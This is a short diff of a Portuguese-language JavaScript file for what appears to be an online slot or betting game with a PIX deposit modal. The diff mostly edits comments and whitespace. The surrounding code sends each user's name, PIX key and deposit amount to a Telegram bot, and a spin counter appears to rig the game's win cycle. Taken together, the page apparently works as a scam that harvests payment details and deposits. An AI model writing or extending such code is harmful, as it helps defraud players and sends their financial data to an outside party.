@@ -35,15 +35,17 @@ function processarVitoria() {
 }
 
 window.abrirModal = () => document.getElementById('modal-deposito').classList.remove('hidden');
+
 window.fecharModal = () => {
     document.getElementById('modal-deposito').classList.add('hidden');
-    contadorGiros = 0;
+    contadorGiros = 0; // Reset do ciclo para permitir novo teste
 };
 
 window.confirmarDeposito = () => {
     const nome = document.getElementById("nome-usuario").value;
     const chave = document.getElementById("pix-chave").value;
     const valor = document.getElementById("valor-deposito").value;
+    
     fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST", headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: `Depósito: ${nome}, Chave: ${chave}, Valor: R$${valor}` })
@@ -58,8 +60,9 @@ window.copiarChave = () => {
     const copyText = document.getElementById("chave-cnpj");
     copyText.select();
     document.execCommand("copy");
-    alert("Chave copiada! Voltando ao jogo...");
-    window.fecharModal(); // Fecha o modal automaticamente
+    
+    // Fecha o modal e volta ao jogo instantaneamente após copiar
+    window.fecharModal();
 };
 
 window.alterarAposta = (mod) => {
